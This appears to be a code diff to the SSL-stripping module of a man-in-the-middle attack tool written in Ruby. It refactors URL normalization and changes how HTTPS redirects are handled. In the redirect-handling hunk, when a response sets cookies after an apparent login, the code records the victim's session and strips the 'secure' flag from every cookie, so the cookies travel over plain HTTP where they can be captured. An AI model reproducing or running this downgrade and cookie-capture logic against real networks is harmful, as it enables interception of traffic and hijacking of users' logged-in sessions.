@@ -75,6 +75,11 @@ class StrippedObject
     stripped
   end
 
+  def self.process( url )
+    normalized = self.normalize(url)
+    stripped   = self.strip(normalized)
+    [ normalized, stripped ]
+  end
 end
 
 # Handle SSL stripping.
@@ -208,19 +213,34 @@ class Strip
   def process_redirection!(request,response)
     # check for a redirect
     if response['Location'].start_with?('https://')
-      original = StrippedObject.normalize( response['Location'] )
-      stripped = StrippedObject.strip( response['Location'] )
-
-      Logger.info "[#{'SSLSTRIP'.green} #{request.client}] Found redirect to HTTPS '#{original}'."
+      original, stripped = StrippedObject.process( response['Location'] )
 
       @stripped << StrippedObject.new( request.client, original, stripped )
-      # The request will be retried on port 443 if MAX_REDIRECTS is not reached.
-      request.port = 443
+
       # If MAX_REDIRECTS is reached, the 'Location' header will be used.
       response['Location'] = stripped
 
-      # retry the request if possible
-      return true
+      # no cookies set, just a normal http -> https redirect
+      if response['Set-Cookie'].empty?
+        Logger.info "[#{'SSLSTRIP'.green} #{request.client}] Found redirect to HTTPS '#{original}' -> '#{stripped}'."
+
+        # The request will be retried on port 443 if MAX_REDIRECTS is not reached.
+        request.port = 443
+        # retry the request if possible
+        return true
+      # cookies set, this is probably a redirect after a login.
+      else
+        Logger.info "[#{'SSLSTRIP'.green} #{request.client}] Found redirect to HTTPS ( with cookies ) '#{original}' -> '#{stripped}'."
+        # we know this session, do not kill it!
+        @cookies.add!( request )
+        # remove the 'secure' descriptor from every cookie
+        response.each_header('Set-Cookie') do |value,i|
+          response.headers[i] = "Set-Cookie: #{value.gsub( /secure/, '' )}"
+        end
+
+        # do not retry request
+        return false
+      end
     end
     false
   end
@@ -232,17 +252,14 @@ class Strip
     begin
       response.body.scan( HTTPS_URL_RE ).uniq.each do |link|
         if link[0].include?('.')
-          link     = StrippedObject.normalize( link[0] )
-          stripped = StrippedObject.strip( link )
-
-          links << [link, stripped]
+          links << StrippedObject.process( link[0] )
         end
       end
     # handle errors due to binary content
     rescue; end
 
     unless links.empty?
-      Logger.info "[#{'SSLSTRIP'.green} #{request.client}] Stripping #{links.size} HTTPS link#{if links.size > 1 then 's' else '' end} inside '#{request.to_url}'."
+      Logger.debug "[#{'SSLSTRIP'.green} #{request.client}] Stripping #{links.size} HTTPS link#{if links.size > 1 then 's' else '' end} inside '#{request.to_url}'."
 
       links.each do |l|
         original, stripped = l
